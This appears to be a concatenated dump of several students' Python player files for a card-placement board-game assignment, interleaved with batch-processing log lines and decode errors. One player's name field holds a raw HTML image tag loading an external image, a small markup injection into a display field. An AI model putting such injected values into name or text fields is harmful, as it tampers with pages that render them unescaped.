A20= [[4, 1, 4, 2], [1, 1, 4, 4], [4, 4, 1, 1], [2, 4, 1, 4]]
A21= [[1, 2, 1, 3], [2, 2, 1, 1], [1, 1, 2, 2], [3, 1, 2, 1]]
A22= [[2, 4, 2, 1, 3], [4, 4, 2, 1, 1], [1, 4, 2, 1, 4]]
A23 = [[3, 4, 1, 4], [4, 4, 1, 1], [1, 1, 4, 4], [4, 1, 4, 3]]
A24 = [[4, 3, 4, 1, 2], [3, 3, 4, 1, 1], [1, 3, 4, 1, 3]]
A25=[[2, 4, 3, 4], [4, 4, 3, 3], [3, 3, 4, 4], [4, 3, 4, 2]]
A26 = [[4, 3, 4, 2], [3, 3, 4, 4], [4, 4, 3, 3], [2, 4, 3, 4]]

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "<img src='https://i.imgur.com/sQOKHZf.png' alt='Velecute'>"

    def play(self,newCardOnDesk):
        
        def Napln0Pole(x,y):
            m = [[0 for _ in range(y)] for _ in range(x)]
            return m
        def PolozKarty(m,PolozeneKarty):
            for card in PolozeneKarty:
                if card == []:
                    continue
                posX, posY = card[0], card[1]
                for i, row in enumerate(card[2]):
                    for j, value in enumerate(row):
                        x, y = posX + i, posY + j
                        if 0 <= x < len(m) and 0 <= y < len(m[0]):
                            m[x][y] = value + 1
                              
            return m
        def CanPlace(RX,RY,card,m1):
            result = []
            for i in range(len(m1) - RX + 1):  
                for j in range(len(m1[0]) - RY + 1): 
                    can_place = True
                    NearACard = False
                    for x in range(i, i + RX):  
                        for y in range(j, j + RY):
                            if not (0 <= x < len(m1) and 0 <= y < len(m1[0])):  
                                can_place = False
                                break
                            if m1[x][y] != 0:  
                                can_place = False
                                break
                            neighbors = [(x + 1, y), (x - 1, y), (x, y + 1), (x, y - 1) ]
                            for nx, ny in neighbors:
                                if 0 <= nx < len(m1) and 0 <= ny < len(m1[0]) and m1[nx][ny] != 0:
                                    NearACard = True
                        if not can_place:
                            break
                    if can_place and NearACard:
                        Coords = [i, j]
                        Coords.append(card)
                        result.append(Coords)
            return result
        def RotateCard(card):
            x = len(card) 
            y = len(card[0])
            rotated = [[0] * x for _ in range(y)] 

            for i in range(x): 
                for j in range(y):
                    
                    rotated[j][x - 1 - i] = card[i][j]
            return rotated       
        def PocitejCesty(m,card):
            posX,posY = card[0], card[1]
            row,col = len(card[2]),len(card[2][0])
            zasobnik = []
            Cena = 0
            CenaTemp = 0
            PouziteCoords = []
            
            a,b = -1, -1
            for k in range(posX, posX + row):
                a += 1
                b = -1
                for j in range(posY, posY + col):
                    if 0 <= k < len(m) and 0 <= j < len(m[0]):
                        b += 1
                        m[k][j] = card[2][a][b] + 1
                        

            for k in range(posX, posX + row):
                for j in range(posY, posY + col):
                    if (m[k][j] != 1) and (m[k][j] != 0):
                        barva = m[k][j]
                        zasobnik = [(k,j)]
                        MimoKartu = False
                        while (zasobnik):
                            x,y = zasobnik.pop()
                            
                            if (0 <= x < len(m)) and (0 <= y < len(m[0])) and (m[x][y] == barva) and ((x,y) not in PouziteCoords):
                                if (x < posX) or (x >= (posX+ row) or (y < posY) or (y >= (posY + col))):
                                    MimoKartu = True
                                    CenaTemp += 1
                                PouziteCoords.append((x, y))
        
                                zasobnik.append((x + 1,y))
                                zasobnik.append((x - 1,y))
                                zasobnik.append((x,y + 1))
                                zasobnik.append((x,y -1))
                        if MimoKartu:
                            Cena += CenaTemp
                            CenaTemp = 0
                        else:
                            CenaTemp = 0
                    
            for k in range(posX, posX + row):
                for j in range(posY, posY + col):
                    if 0 <= k < len(m) and 0 <= j < len(m[0]):
                        m[k][j] = 0
            return Cena
        
        t1 = time.time()
        Rozmery = [int(self.boardRows),int(self.boardCols)]
        PolozeneKarty = self.cardsOnDesk
        if newCardOnDesk:
            PolozeneKarty.append(newCardOnDesk)

        KartyVRuce = self.cardsAtHand
    
        if KartyVRuce == []:
            return []
        
        if PolozeneKarty == []:
            MinRozmerX =  float('inf')
            indmin = 0
            for i,card in enumerate(KartyVRuce):
                if MinRozmerX > len(card[0]):
                    MinRozmerX = len(card[0])
                    indmin = i
            Karta = KartyVRuce.pop(indmin)
            PolozeneKarty.append([0 ,0 ,Karta])
            
            return [0 ,0 ,Karta]
        
        else:
            m0 = Napln0Pole(Rozmery[0],Rozmery[1])
            m1 = PolozKarty(m0,PolozeneKarty)
            
            results = []
            
            if len(KartyVRuce) > 17:
                UsedCards = []
                for card in KartyVRuce:
                    if card in UsedCards:
                        continue
                    UsedCards.append(card)
                    row, col = len(card),len(card[0])
                    if row == col:
                        results.append(CanPlace(row,col,card,m1))
                    else:
                        results.append(CanPlace(row,col,card,m1))
                        
                        
                f_results = [p for card_results in results for p in card_results]
            
                if f_results == []:
                
                    return []
                else:
                    MaxCena = float("-inf")
                    Ceny = []
                    indMax = 0 
                    for moznost in f_results:
                        Ceny.append(PocitejCesty(m1,moznost))
                    for i in range(len(Ceny)):
                        if Ceny[i] == 0:
                            continue
                        if Ceny[i] > MaxCena:
                            MaxCena = Ceny[i]
                            indMax = i
                    PolozeneKarty.append([f_results[indMax][0],f_results[indMax][1],f_results[indMax][2]])
                    if f_results[indMax][2] in KartyVRuce:
                        KartyVRuce.remove(f_results[indMax][2]) 
                    else:
                        a1 = RotateCard(f_results[indMax][2])
                        a2 = RotateCard(a1)
                        a3 = RotateCard(a2)
                        if a1 in KartyVRuce:
                            KartyVRuce.remove(a1)
                        elif a2 in KartyVRuce:
                            KartyVRuce.remove(a2)
                        elif a3 in KartyVRuce:
                            KartyVRuce.remove(a3) 
                    t2 = time.time()
                    #print(t2 -t1)
                    return f_results[indMax]
            elif len(KartyVRuce) > 9:
                UsedCards = []
                for card in KartyVRuce:
                    if card in UsedCards:
                        continue
                    UsedCards.append(card)
                    row, col = len(card),len(card[0])
                    if row == col:
                        results.append(CanPlace(row,col,card,m1))
                    else:
                        results.append(CanPlace(row,col,card,m1))
                        cardR1 = RotateCard(card)
                        results.append(CanPlace(col,row,cardR1,m1))
                        
                f_results = [p for card_results in results for p in card_results]
            
                if f_results == []:
                
                    return []
                else:
                    MaxCena = float("-inf")
                    Ceny = []
                    indMax = 0 
                    for moznost in f_results:
                        Ceny.append(PocitejCesty(m1,moznost))
                    for i in range(len(Ceny)):
                        if Ceny[i] == 0:
                            continue
                        if Ceny[i] > MaxCena:
                            MaxCena = Ceny[i]
                            indMax = i
                    PolozeneKarty.append([f_results[indMax][0],f_results[indMax][1],f_results[indMax][2]])
                    if f_results[indMax][2] in KartyVRuce:
                        KartyVRuce.remove(f_results[indMax][2]) 
                    else:
                        a1 = RotateCard(f_results[indMax][2])
                        a2 = RotateCard(a1)
                        a3 = RotateCard(a2)
                        if a1 in KartyVRuce:
                            KartyVRuce.remove(a1)
                        elif a2 in KartyVRuce:
                            KartyVRuce.remove(a2)
                        elif a3 in KartyVRuce:
                            KartyVRuce.remove(a3) 
                    t2 = time.time()
                    #print(t2 -t1)
                    return f_results[indMax]
            else:    
                for card in KartyVRuce:
                    row, col = len(card),len(card[0])
                    results.append(CanPlace(row,col,card,m1))
                    cardR1 = RotateCard(card)
                    results.append(CanPlace(col,row,cardR1,m1))
                    cardR2 = RotateCard(cardR1)
                    results.append(CanPlace(row,col,cardR2,m1))
                    cardR3 = RotateCard(cardR2)
                    results.append(CanPlace(col,row,cardR3,m1))
                
                f_results = [p for card_results in results for p in card_results]
            
                if f_results == []:
                
                    return []
                else:
                    MaxCena = float("-inf")
                    Ceny = []
                    indMax = 0 
                    for moznost in f_results:
                        Ceny.append(PocitejCesty(m1,moznost))
                    for i in range(len(Ceny)):
                        if Ceny[i] > MaxCena:
                            MaxCena = Ceny[i]
                            indMax = i
                    PolozeneKarty.append([f_results[indMax][0],f_results[indMax][1],f_results[indMax][2]])
                    if f_results[indMax][2] in KartyVRuce:
                        KartyVRuce.remove(f_results[indMax][2]) # misto remove to musim vyresit jinak
                    else:
                        a1 = RotateCard(f_results[indMax][2])
                        a2 = RotateCard(a1)
                        a3 = RotateCard(a2)
                        if a1 in KartyVRuce:
                            KartyVRuce.remove(a1)
                        elif a2 in KartyVRuce:
                            KartyVRuce.remove(a2)
                        elif a3 in KartyVRuce:
                            KartyVRuce.remove(a3) 
                    t2 = time.time()
                    #print(t2 -t1)          
                       
                    return f_results[indMax]

if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    #tmp = [A1, A2, A3, A4, A5, A6, A7, A8, A9, A10, A11, A12, A13, A14, A15, A16, A17, A18, A19, A20, A21, A22]
    tmp =  [[[2, 3, 2, 1, 4], [3, 3, 2, 1, 1], [1, 3, 2, 1, 3]], [[4, 2, 4, 3, 1], [2, 2, 4, 3, 3], [3, 2, 4, 3, 2]], [[2, 3, 2, 4], [3, 3, 2, 2], [2, 2, 3, 3], [4, 2, 3, 2]], [[4, 1, 4, 2, 3], [1, 1, 4, 2, 2], [2, 1, 4, 2, 1]], [[3, 4, 3, 1, 2], [4, 4, 3, 1, 1], [1, 4, 3, 1, 4]], [[1, 4, 1, 3], [4, 4, 1, 1], [1, 1, 4, 4], [3, 1, 4, 1]], [[2, 1, 2, 4], [1, 1, 2, 2], [2, 2, 1, 1], [4, 2, 1, 2]], [[3, 1, 3, 2, 4], [1, 1, 3, 2, 2], [2, 1, 3, 2, 1]], [[1, 4, 1, 2, 3], [4, 4, 1, 2, 2], [2, 4, 1, 2, 4]], [[3, 4, 3, 2, 1], [4, 4, 3, 2, 2], [2, 4, 3, 2, 4]], [[2, 1, 2, 4, 3], [1, 1, 2, 4, 4], [4, 1, 2, 4, 1]], [[3, 2, 3, 1], [2, 2, 3, 3], [3, 3, 2, 2], [1, 3, 2, 3]], [[4, 3, 4, 1, 2], [3, 3, 4, 1, 1], [1, 3, 4, 1, 3]], [[3, 1, 3, 4], [1, 1, 3, 3], [3, 3, 1, 1], [4, 3, 1, 3]], [[3, 2, 3, 4, 1], [2, 2, 3, 4, 4], [4, 2, 3, 4, 2]], [[2, 4, 2, 1, 3], [4, 4, 2, 1, 1], [1, 4, 2, 1, 4]], [[4, 2, 4, 1], [2, 2, 4, 4], [4, 4, 2, 2], [1, 4, 2, 4]], [[1, 2, 1, 4, 3], [2, 2, 1, 4, 4], [4, 2, 1, 4, 2]], [[3, 2, 3, 1, 4], [2, 2, 3, 1, 1], [1, 2, 3, 1, 2]], [[3, 1, 3, 4, 2], [1, 1, 3, 4, 4], [4, 1, 3, 4, 1]], [[2, 1, 2, 3, 4], [1, 1, 2, 3, 3], [3, 1, 2, 3, 1]], [[2, 3, 2, 4, 1], [3, 3, 2, 4, 4], [4, 3, 2, 4, 3]]]
    p1 = Player("testA", 33, 33, tmp)
    p2 = Player("testB", 33, 33, tmp)

    p2move = []
    gameStep = 0
    
    
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        #p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        #p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()
    

    pernipa1
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/pernipa1______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 13549: ordinal not in range(128)    cejkaja5
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/cejkaja5______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 642: ordinal not in range(128)    stercdom
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/stercdom______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


# basic cards with colors 1 and 2
# note that Brute can provide you also other cards!
C44a = [[0, 1, 2, 0], [1, 1, 2, 2], [2, 2, 1, 1], [0, 2, 1, 0]]

C44b = [[0, 0, 1, 0], [1, 1, 1, 0], [0, 2, 2, 2], [0, 2, 0, 0]]

C53b = [[0, 1, 0], [0, 1, 0], [0, 1, 0], [0, 1, 1], [0, 0, 0]]

C53c = [[0, 1, 0], [0, 1, 0], [0, 1, 1], [0, 2, 2], [0, 2, 0]]

C33a = [[0, 1, 0], [1, 1, 2], [0, 0, 2]]

C33c = [[1, 2, 1], [2, 2, 2], [1, 2, 1]]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "justLikeOtters"
        self.board_rows = boardRows
        self.board_cols = boardCols
        self.board = [[-1] * boardCols for i in range(boardRows)]
        self.hand = []
        for card in cardsAtHand:
            self.hand.append(self.process_card(card))
        self.oponent_hand = self.hand[:]
        self.edges = []
        self.first_round = True
        self.onboard_component_edges = []

    def process_card(self, card):
        # card = [[strings], [rotation0], [rotation1], [rotation2], [rotation3]]
        # rotation = [matrix, rows, cols, components]
        output = [[]]

        # first rotation
        string = ""
        for list in card:
            string += f"{list}"
        output[0].append(string)
        components = self.get_components(card)
        output.append([card, len(card), len(card[0]), components])

        for i in range(3):
            c_card = output[-1][0][:]
            c_comps = output[-1][3][:]
            c_card, c_comps = self.rotate(c_card, c_comps)
            string = ""
            for list in c_card:
                string += f"{list}"
            if string not in output[0]:
                output[0].append(string)
                output.append([c_card, output[-1][2], output[-1][1], c_comps])
        return output

    def get_components(self, card):
        # komponenta = [sides, size, color]
        komponenty = []
        helpful_matrix = [[True] * len(card[0]) for i in range(len(card))]
        for i in range(len(card)):
            for j in range(len(card[0])):
                if helpful_matrix[i][j] and card[i][j] != 0:
                    color = card[i][j]
                    count = 1
                    matrix_copy = [card[j][:] for j in range(len(card))]
                    stack = [[i, j]]
                    matrix_copy[i][j] = 0
                    sides = []
                    while stack:
                        current = stack.pop()
                        if (
                            current[0] == 0
                            or current[1] == 0
                            or current[0] == len(card) - 1
                            or current[1] == len(card[0]) - 1
                        ):
                            sides.append((current[0], current[1]))
                        helpful_matrix[current[0]][current[1]] = False
                        new, add = self.populate(
                            current[0], current[1], matrix_copy, color
                        )
                        for coord in new:
                            matrix_copy[coord[0]][coord[1]] = 0
                        stack = stack + new
                        count += add
                    komponenty.append([sides, count, color])
        return komponenty

    def populate(self, i, j, matrix, color):
        count = 0
        new = []
        if i > 0:
            if matrix[i - 1][j] == color:
                count += 1
                new.append([i - 1, j])
        if j > 0:
            if matrix[i][j - 1] == color:
                count += 1
                new.append([i, j - 1])
        if i < len(matrix) - 1:
            if matrix[i + 1][j] == color:
                count += 1
                new.append([i + 1, j])
        if j < len(matrix[0]) - 1:
            if matrix[i][j + 1] == color:
                count += 1
                new.append([i, j + 1])
        return new, count

    def rotate(self, matrix, komponenty):
        new_matrix = []
        for j in range(len(matrix[0])):
            crow = []
            for i in range(len(matrix)):
                crow.append(matrix[i][j])
            new_matrix = [crow] + new_matrix
        matrix = new_matrix
        for i in range(len(komponenty)):
            sides = []
            for coord in komponenty[i][0]:
                sides.append((len(matrix) - coord[1] - 1, coord[0]))
            komponenty[i] = [sides, komponenty[i][1], komponenty[i][2]]

        return matrix, komponenty

    def connect_comps(self, new, old):

        new[0] += old[0]
        if old != new:
            for point in old[2]:
                if point in self.onboard_component_edges:
                    new[2].append(point)
                    self.board[point[0]][point[1]] = new

    def place_card(self, card, x, y):
        not_first_row = x != 0
        not_first_col = y != 0
        not_last_row = x != self.board_rows - card[1]
        not_last_col = y != self.board_cols - card[2]
        for i in range(card[1]):
            for j in range(card[2]):
                self.board[x + i][y + j] = 0
                # get edges
                if i == 0 and not_first_row:
                    self.edges.append((x - 1, y + j))
                if i == card[1] - 1 and not_last_row:
                    self.edges.append((x + i + 1, y + j))
                if j == 0 and not_first_col:
                    self.edges.append((x + i, y - 1))
                if j == card[2] - 1 and not_last_col:
                    self.edges.append((x + i, y + j + 1))
        self.flter_edges()

        for comp in card[3]:
            representation = [comp[1], comp[2], []]  # size, color, points
            for coord in comp[0]:
                self.board[x + coord[0]][y + coord[1]] = representation
                onboard_coords = (x + coord[0], y + coord[1])
                representation[2].append(onboard_coords)

                # check for connected components
                for on_board_comp in self.onboard_component_edges:
                    if (on_board_comp[0] - 1, on_board_comp[1]) == onboard_coords:
                        if (
                            representation[1]
                            == self.board[on_board_comp[0]][on_board_comp[1]][1]
                            and coord
                            not in self.board[on_board_comp[0]][on_board_comp[1]][2]
                        ):
                            self.connect_comps(
                                representation,
                                self.board[on_board_comp[0]][on_board_comp[1]],
                            )
                    if (on_board_comp[0] + 1, on_board_comp[1]) == onboard_coords:
                        if (
                            representation[1]
                            == self.board[on_board_comp[0]][on_board_comp[1]][1]
                            and coord
                            not in self.board[on_board_comp[0]][on_board_comp[1]][2]
                        ):
                            self.connect_comps(
                                representation,
                                self.board[on_board_comp[0]][on_board_comp[1]],
                            )
                    if (on_board_comp[0], on_board_comp[1] - 1) == onboard_coords:
                        if (
                            representation[1]
                            == self.board[on_board_comp[0]][on_board_comp[1]][1]
                            and coord
                            not in self.board[on_board_comp[0]][on_board_comp[1]][2]
                        ):
                            self.connect_comps(
                                representation,
                                self.board[on_board_comp[0]][on_board_comp[1]],
                            )
                    if (on_board_comp[0], on_board_comp[1] + 1) == onboard_coords:
                        if (
                            representation[1]
                            == self.board[on_board_comp[0]][on_board_comp[1]][1]
                            and coord
                            not in self.board[on_board_comp[0]][on_board_comp[1]][2]
                        ):
                            self.connect_comps(
                                representation,
                                self.board[on_board_comp[0]][on_board_comp[1]],
                            )

                self.onboard_component_edges.append(onboard_coords)
        self.filter_onboard_component_edges()

    def filter_onboard_component_edges(self):
        for edge in self.onboard_component_edges[:]:
            if edge[0] - 1 >= 0:
                if self.board[edge[0] - 1][edge[1]] == -1:
                    continue
            if edge[0] + 1 < self.board_rows:
                if self.board[edge[0] + 1][edge[1]] == -1:
                    continue
            if edge[1] - 1 >= 0:
                if self.board[edge[0]][edge[1] - 1] == -1:
                    continue
            if edge[1] + 1 < self.board_cols:
                if self.board[edge[0]][edge[1] + 1] == -1:
                    continue
            self.onboard_component_edges.remove(edge)
            self.board[edge[0]][edge[1]] = 0

    def flter_edges(self):
        seen = []
        for edge in self.edges[:]:
            if self.board[edge[0]][edge[1]] != -1 or edge in seen:
                self.edges.remove(edge)
            seen.append(edge)

    def placable(self, coord, rows, cols):
        for i in range(rows):
            for j in range(cols):
                if (
                    0 <= coord[0] + i < self.board_rows
                    and 0 <= coord[1] + j < self.board_cols
                ):
                    if self.board[coord[0] + i][coord[1] + j] != -1:
                        return False
                else:
                    return False
        return True

    def calculate_placed(self, position, rotation):
        out = 0
        seen = []
        for comp in rotation[3]:
            current_connected = []
            for coord in comp[0]:
                # up
                if coord[0] + position[0] > 0:
                    tile = self.board[coord[0] + position[0] - 1][
                        coord[1] + position[1]
                    ]
                    if tile != 0 and tile != -1:
                        if tile not in current_connected and tile[1] == comp[2]:
                            current_connected.append(tile)
                            if tile not in seen:
                                out += tile[0] + comp[1]
                                seen.append(tile)
                            else:
                                out += comp[1]
                # down
                if coord[0] + position[0] < self.board_rows - 1:
                    tile = self.board[coord[0] + position[0] + 1][
                        coord[1] + position[1]
                    ]
                    if tile != 0 and tile != -1:
                        if tile not in current_connected and tile[1] == comp[2]:
                            current_connected.append(tile)
                            if tile not in seen:
                                out += tile[0] + comp[1]
                                seen.append(tile)
                            else:
                                out += comp[1]
                # left
                if coord[1] + position[1] > 0:
                    tile = self.board[coord[0] + position[0]][
                        coord[1] + position[1] - 1
                    ]
                    if tile != 0 and tile != -1:
                        if tile not in current_connected and tile[1] == comp[2]:
                            current_connected.append(tile)
                            if tile not in seen:
                                out += tile[0] + comp[1]
                                seen.append(tile)
                            else:
                                out += comp[1]
                # right
                if coord[1] + position[1] < self.board_cols - 1:
                    tile = self.board[coord[0] + position[0]][
                        coord[1] + position[1] + 1
                    ]
                    if tile != 0 and tile != -1:
                        if tile not in current_connected and tile[1] == comp[2]:
                            current_connected.append(tile)
                            if tile not in seen:
                                out += tile[0] + comp[1]
                                seen.append(tile)
                            else:
                                out += comp[1]
        return out

    def play(self, newCardOnDesk):
        """this method is called during the game.
        The input argument newCardOnDesk is:
        - [] if other player didn't place any card in his move), or
        - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board

        Return value:
        - [ row, col, cardMatrix ] if you want to place a card, or
        - [] if no card can be placed
        """

        if newCardOnDesk:
            self.first_round = False
            # removes card from oponent hand
            card = None
            string = ""
            rotation = 0
            for line in newCardOnDesk[2]:
                string += f"{line}"
            for i in range(len(self.oponent_hand)):
                if string in self.oponent_hand[i][0]:
                    rotation = self.oponent_hand[i][0].index(string)
                    card = self.oponent_hand.pop(i)
                    break

            # place card
            self.place_card(card[rotation + 1], newCardOnDesk[0], newCardOnDesk[1])

        if self.first_round:
            self.first_round = False
            self.edges = [(0, 0)]

        best_move = []
        tiles = {}
        seen = []
        for card in self.hand:
            for i in range(1, len(card)):
                seen = []
                if not (card[i][1], card[i][2]) in tiles:
                    tiles[(card[i][1], card[i][2])] = []
                    for edge in self.edges:
                        for j in range(card[i][1]):
                            if edge[0] - j < 0:
                                break
                            for k in range(card[i][2]):
                                if edge[1] - k < 0:
                                    break
                                current = (edge[0] - j, edge[1] - k)

                                if (
                                    current not in tiles[(card[i][1], card[i][2])]
                                    and current not in seen
                                ):
                                    if self.placable(current, card[i][1], card[i][2]):
                                        tiles[(card[i][1], card[i][2])].append(current)
                                    else:
                                        seen.append(current)

                for position in tiles[(card[i][1], card[i][2])]:
                    price = self.calculate_placed(position, card[i])
                    if not best_move or price > best_move[0]:
                        best_move = [price, position, card[i], card]
                        break

        if best_move:
            self.hand.remove(best_move[3])
            self.place_card(best_move[2], best_move[1][0], best_move[1][1])
            return [best_move[1][0], best_move[1][1], best_move[2][0]]
        return []

        # recommened steps
        # step 0: write newCardOnDesk to list of cards that are on the board game
        # step 1: compute all possible placement of your all (so for available) cards
        # step 2: evaluate each placement, i.e., compute score for it
        # step 3: select card that you want to place to the game board, mark it as used (not available in future)
        # step 4: return your placement, or [] if no placement can be made
        # the following code DOES NOT provides correct moves,
        # it just return random card at random position


if __name__ == "__main__":
    """when you run:
    python3 player.py

    you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a, C33c, C53c, C53b] * 1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(
            p1.boardRows,
            p1.boardCols,
            p1.cardsOnDesk,
            "move-{:02}b-A.png".format(gameStep),
        )

        p2move = p2.play(p1move)
        print("p2 returned", p2move)
        p2.drawCards(
            p2.boardRows,
            p2.boardCols,
            p2.cardsOnDesk,
            "move-{:02}b-B.png".format(gameStep),
        )
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()
    bubenkry
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/bubenkry______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

class Card:
    """
    Helper class to store cards easily and get their rotations and other parameters
    """
    def __init__(self, height, width, content, x=-1, y=-1, create_rotations=False, was_played=False):
        self.height = height
        self.width = width
        self.x = x
        self.y = y
        self.content = content
        self.was_played = was_played
        self.rotations = []
        if (create_rotations):
            self.rotations = self.compute_rotations()
  
    # Computes the rotations for the card
    def compute_rotations(self):
        rotations = []
        current_content = self.content
        current_height = self.height
        current_width = self.width
        for _ in range(4):
            rotated_card = Card(current_height,current_width,current_content,self.x,self.y,False)
            if rotated_card not in rotations:
                rotations.append(rotated_card)
            current_height, current_width = current_width, current_height
            current_content = self.rotate_matrix(current_content)
        return rotations
 
    # Static method to rotate the card and save the rotations
    @staticmethod
    def rotate_matrix(matrix):
        return [list(row) for row in zip(*matrix[::-1])]
      
    def __eq__(self, other):
        if not isinstance(other, Card):
            return False
        return self.content == other.content
    
    def __str__(self):
        position = f"({self.x}, {self.y})" if self.x != -1 and self.y != -1 else "Not placed"
        content_string = "\n".join(" ".join(map(str, row)) for row in self.content)
        return (
            f"Card:\n"
            f"  Dimensions: {self.height}x{self.width}\n"
            f"  Position: {position}\n"
            f"  Content:\n{content_string}"
        )
    
# Using DFS we find the component from a specific point and if it goes past the card we save it
def dfs(matrix: list, visited: list, i: int, j: int, value: int, card: Card):
    if i < 0 or i >= len(matrix) or j < 0 or j >= len(matrix[0]) or visited[i][j] or matrix[i][j] != value:
        return 0, False
    visited[i][j] = True
    size = 1
    extends_beyond_card = False
    if i < card.y or i >= card.y + card.height or j < card.x or j >= card.x + card.width:
        extends_beyond_card = True
    directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]
    for direction in directions:
        sub_size, sub_extends_beyond_card = dfs(matrix, visited, i + direction[0], j + direction[1], value, card)
        size += sub_size
        if sub_extends_beyond_card:
            extends_beyond_card = True
    return size, extends_beyond_card
 
# Helper function so go through all the point of a card and run the DFS on each of them
def find_connected_components(card: Card) -> int:
    copy_matrix = [row[:] for row in game_matrix]
    put_card_in_game(card, copy_matrix)
    visited = [[False for _ in range(S)] for _ in range(R)]
    components = []
    for i in range(card.height):
        for j in range(card.width):
            if copy_matrix[card.y + i][card.x + j] >= 1 and not visited[card.y + i][card.x + j]:
                component_size, extends_beyond_card = dfs(copy_matrix, visited, card.y + i, card.x + j, copy_matrix[card.y + i][card.x + j], card)
                if extends_beyond_card:
                    components.append(component_size)
    return sum(components)
 
# Returns all valid position in format [(top_left_x, top_left_y), Card card_with_rotation]
def get_valid_positions(card: Card) -> list:
    valid_positions = []
    for y in range(R):
        for x in range(S):
            for rotation in card.rotations:
                if (is_valid_position(x,y,rotation)):
                    valid_positions.append([(x,y),rotation])
    return valid_positions
 
# Checks if a card can be put into a specific place without violating the rules of the game
def is_valid_position(x: int, y:int, card: Card) -> bool:
    has_neighbour = False
    if x < 0 or y < 0 or x + card.width > S or y + card.height > R:
        return False
    for dy in range(card.height):
        for dx in range(card.width):
            current_x, current_y = x + dx, y + dy
            if game_matrix[current_y][current_x] != -1:
                return False
            neighbors = [
                (current_x - 1, current_y),  # Left
                (current_x + 1, current_y),  # Right
                (current_x, current_y - 1),  # Above
                (current_x, current_y + 1),  # Below
            ]
            for nx, ny in neighbors:
                if 0 <= nx < S and 0 <= ny < R and game_matrix[ny][nx] != -1:
                    has_neighbour = True
    return has_neighbour
 
# Helper function that puts a card into the given matrix, used for evaluating which moves are best
def put_card_in_game(card: Card, matrix: list):
    for y in range(card.height):
        for x in range(card.width):
            matrix[card.y+y][card.x+x] = card.content[y][x]

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, initCards):
        super().__init__(login, boardRows, boardCols, initCards)

        global R, S, game_matrix
        R = boardRows
        S = boardCols
        game_matrix = [[-1 for _ in range(S)] for _ in range(R)]
        self.availableCards = []
        for card in initCards:
            temp = Card(len(card),len(card[0]),card,-1,-1,True)
            self.availableCards.append(temp)

        self.playerName = "The 'I just want to pass this class' player"

    def play(self, newCardOnDesk):
        if len(newCardOnDesk) == 3:
            temp = Card(len(newCardOnDesk[2]), len(newCardOnDesk[2][0]), newCardOnDesk[2], newCardOnDesk[1], newCardOnDesk[0], False)
            put_card_in_game(temp, game_matrix)

        if len(self.availableCards) == 0:
            return []
        
        if all(cell == -1 for row in game_matrix for cell in row):
            random_card = random.choice(self.availableCards)
            max_x = S - random_card.width
            max_y = R - random_card.height
            random_x = random.randint(0, max_x)
            random_y = random.randint(0, max_y)
            random_card.x, random_card.y = random_x, random_y
            put_card_in_game(random_card, game_matrix)
            random_card.was_played = True
            return [random_y, random_x, random_card.content]

        best_move = None
        best_score = float('-inf')
        best_card = None
        for card in self.availableCards:
            if card.was_played:
                continue
            for (position, rotated_card) in get_valid_positions(card):
                rotated_card.x, rotated_card.y = position
                temp_matrix = [row[:] for row in game_matrix]
                put_card_in_game(rotated_card, temp_matrix)

                score = find_connected_components(rotated_card)
                if score > best_score:
                    best_score = score
                    best_move = (rotated_card, position)
                    best_card = card

        if not best_move:
            return []

        chosen_card, (x, y) = best_move
        chosen_card.x, chosen_card.y = x, y
        put_card_in_game(chosen_card, game_matrix)
        best_card.was_played = True

        return [y, x, chosen_card.content]


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


